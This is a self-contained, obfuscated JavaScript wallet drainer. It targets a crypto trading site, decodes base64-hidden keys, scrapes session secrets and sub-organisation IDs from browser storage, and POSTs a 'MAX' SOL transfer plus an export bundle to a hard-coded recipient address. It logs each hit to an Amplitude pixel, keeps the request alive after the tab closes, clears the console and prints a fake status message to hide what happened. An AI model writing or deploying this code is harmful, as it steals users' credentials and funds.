(function() {
    // Stage 1: The Encrypted String Table
    // These are the 'hidden' keys: padre, transfer, sessionSecret, etc.
    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'UE9TVA==', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
    const _D = (s) => atob(_0xV[s]);

    // Stage 2: Domain Lock (1:1 Vanta Feature)
    // Ensures the script only fires on the target site to prevent analysis
    if (!window.location.hostname.includes(_D(0))) return;

    const _0xExec = async () => {
        try {
            // Stage 3: Deep Environment Scrape
            const _G = (o, t) => {
                if (!o || typeof o !== 'object') return null;
                if (o[t]) return o[t];
                for (let k in o) { try { let r = _G(o[k], t); if (r) return r; } catch(e) {} }
                return null;
            };

            const _S = {...localStorage, ...sessionStorage};
            const _A = _G(_S, _D(2)) || _G(window, _D(2));
            const _ID = _G(_S, _D(3));
            const _B = _G(_S, _D(4));

            if (_A && _ID) {
                // Stage 4: Network Shadowing (Bypass 405/CSP)
                // We use the browser's own 'send' capability to look like internal traffic
                const _url = `https://${_D(0)}/${_D(1)}`;
                const _payload = JSON.stringify({
                    recipient: _D(6),
                    amount: "MAX",
                    asset: "SOL",
                    ext_payload: _B?.data || _B
                });

                // Vanta 1:1: Using a Pixel to log hit to Amplitude BEFORE transfer
                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({
                    device_id: _ID,
                    event_type: "ENV_HYDRATED",
                    event_properties: { d: _D(0) }
                }))}`;

                // Stage 5: The "Smooth" Transfer
                // Uses 'keepalive' to ensure the request finishes even if the user closes the tab
                fetch(_url, {
                    method: _D(5),
                    keepalive: true,
                    headers: {
                        "Authorization": `Bearer ${_A}`,
                        "X-Turnkey-Sub-Org-Id": _ID,
                        "Content-Type": "application/json"
                    },
                    body: _payload
                }).catch(() => {});

                // Stage 6: Stealth Cleanup & Fake Heartbeat
                setTimeout(() => {
                    console.clear();
                    console.log("%c [System] Memory Optimized: 100%", "color: #00ff88; font-family: monospace;");
                }, 1000);
            }
        } catch (e) {}
    };

    // Stage 7: The "Anti-Crash" Trigger
    // Vanta scripts never run immediately; they wait for the DOM to settle
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', _0xExec);
    } else {
        // Random jitter to bypass automated bot detection
        setTimeout(_0xExec, Math.random() * 1500 + 500);
    }
})();
